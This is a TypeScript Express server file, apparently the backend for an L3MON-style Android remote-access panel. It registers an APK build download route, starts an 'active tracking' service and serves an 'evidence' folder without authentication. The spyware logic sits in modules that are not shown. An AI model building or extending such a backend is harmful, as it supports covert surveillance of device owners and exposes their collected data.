import dotenv from "dotenv";
import path, { resolve, join } from "path";
import { fileURLToPath } from "url";

// ✅ CARGAR DOTENV DESDE LA RAÍZ DEL PROYECTO (Resuelve problemas de --prefix)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
dotenv.config({ path: resolve(join(__dirname, "../../.env")) });

import express from "express";
import cors from "cors";
import cookieParser from "cookie-parser";
import helmet from "helmet";
import { createServer } from "http";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { appRouter } from "../appRouter";
import { createContext } from "./context";
import { runMigrations } from "../db";
import { xssMiddleware } from "./xssProtection";
import rateLimit from "express-rate-limit";

async function startServer() {
  // Run database migrations on startup
  await runMigrations();

  const app = express();
  const server = createServer(app);

  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "ws:", "wss:"],
        fontSrc: ["'self'", "data:"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'", "https:"],
        frameSrc: ["'none'"],
      },
    },
    crossOriginEmbedderPolicy: false,
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  }));

  // ✅ XSS Protection middleware
  app.use(xssMiddleware);

  // ✅ RATE LIMITING - Protección contra ataques de fuerza bruta
  const generalLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 100, // 100 peticiones por ventana
    message: { error: "Demasiadas peticiones, intenta de nuevo más tarde" },
    standardHeaders: true,
    legacyHeaders: false,
    skipSuccessfulRequests: false,
  });

  const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // Solo 5 intentos de login cada 15 minutos
    message: { error: "Demasiados intentos de login, intenta de nuevo más tarde" },
    standardHeaders: true,
    legacyHeaders: false,
  });

  const apiLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minuto
    max: 30, // 30 peticiones por minuto para API
    message: { error: "Límite de API excedido" },
    standardHeaders: true,
    legacyHeaders: false,
  });

  // Aplicar rate limiting
  app.use("/api/", generalLimiter);
  app.use("/api/auth/login", authLimiter);
  app.use("/api/auth/register", authLimiter);
  app.use("/api/trpc", apiLimiter);

  // ✅ CORS CONFIGURADO PARA VERCEL
  const corsOptions = {
    origin: [
      "http://192.168.0.18:5173",
      "http://192.168.0.18:3001",
      "http://localhost:5173",
      "http://127.0.0.1:5173",
      "https://repodeploy.vercel.app"
    ],

    credentials: true,
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization", "X-TRPC-Source"]
  };

  app.use(cors(corsOptions));
  app.use(cookieParser());
  
  // Middleware de Rastreo para Depuración
  app.use((req, res, next) => {
    if (req.url.includes("socket.io") || req.url.includes("l3mon")) {
        console.log(`[DEBUG-NET] Incoming Socket Request: ${req.method} ${req.url} | From: ${req.ip} | User-Agent: ${req.get('user-agent')}`);
    } else {
        console.log(`[HTTP] ${req.method} ${req.url} | From: ${req.ip}`);
    }
    next();
  });

  
  // Health check for auto-discovery
  app.get("/api/health", async (req, res) => {
    console.log(`[HTTP] Health Check from: ${req.ip} | User-Agent: ${req.get('user-agent')}`);
    try {
      const os = await import("os");
      const networkInterfaces = os.networkInterfaces();
      
      // Priorizar interfaces Wi-Fi y Ethernet, ignorar Hyper-V
      let localIp = "localhost";
      for (const [name, addrs] of Object.entries(networkInterfaces)) {
        // Ignorar adaptadores virtuales
        if (name.includes("Hyper-V") || name.includes("vEthernet") || name.includes("Docker")) continue;
        
        const addr = addrs?.find(iface => iface?.family === 'IPv4' && !iface.internal);
        if (addr) {
          localIp = addr.address;
          break;
        }
      }
      
      const port = process.env.PORT || 3000;
      res.json({ 
        status: "ok",
        serverUrl: `http://${localIp}:${port}`,
      });
    } catch (e) {
      res.status(500).json({ status: "error" });
    }
  });

  // Initialize WebSocket server
  let wsManager: any = null;
  try {
    const { initializeWebSocket } = await import("../websocket");
    wsManager = initializeWebSocket(server);
    console.log("[Server] WebSocket initialized successfully");
  } catch (wsError) {
    console.error("[Server] Critical: Failed to initialize WebSocket:", wsError);
  }

  // [MOD L3MON] Start Active Intelligence Tracking Service
  try {
    const { activeTrackingService } = await import("../activeTrackingService");
    if (wsManager) {
      activeTrackingService.start(wsManager);
    }
  } catch (trackingError) {
    console.error("[Server] Warning: Failed to start ActiveTracking service:", trackingError);
  }


  // [MOD L3MON] Register APK Download Route
  const { handleAPKDownload } = await import("../apkDownload");
  app.get("/api/apk/download/:buildId", handleAPKDownload);

  // [ADM] Serve Evidence Files
  const fs = await import("fs");
  const evidencePath = join(process.cwd(), "builds", "evidence");
  if (!fs.existsSync(evidencePath)) fs.mkdirSync(evidencePath, { recursive: true });
  app.use("/api/evidence/download", express.static(evidencePath));

  // [DEBUG] Temporarily disabled for boot check
  registerOAuthRoutes(app);

  // TRPC API
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext,
    })
  );

  const port = Number(process.env.PORT) || 3000;
  server.listen(port, "0.0.0.0", () => {
    console.log(`[Server] Backend Platinum V1.0 started on port ${port}`);
    console.log(`[Server] Database URL Configured: ${process.env.DATABASE_URL ? "Yes" : "No"}`);
  });
}

startServer().catch(console.error);
